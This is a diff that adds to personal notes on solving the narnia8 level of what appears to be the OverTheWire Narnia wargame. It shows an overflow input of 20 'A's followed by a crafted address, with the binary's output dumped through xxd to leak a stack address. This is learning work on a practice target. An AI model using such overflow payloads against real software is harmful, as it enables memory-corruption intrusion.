@@ -613,3 +613,15 @@ I just double checked, env has 18 entries outside gdb; after the two unset comma
 So it must be something else than the env...
 I also noticed that the "_" variable was /usr/bin/env outside of gdb and /usr/bin/gdb inside, so I changed it to match. 
 That moved the address a bit but didn't change the outcome outside gdb... 
+
+===================== I found this xxd thing :) ===============================================
+narnia8@narnia:~$ /narnia/narnia8 $(python -c'print "A"*20') |xxd
+0000000: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
+0000010: 4141 4141 f5d8 ffff 020a                 AAAA......
+
+The address we're looking for is outputted 0xffffd8f5
+
+Now we add 4 bytes:
+narnia8@narnia:~$ /narnia/narnia8 $(python -c'print "A"*20+"\xf1\xd8\xff\xff"') |xxd
+0000000: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
+0000010: 4141 4141 f1d8 ffff 020a                 AAAA......
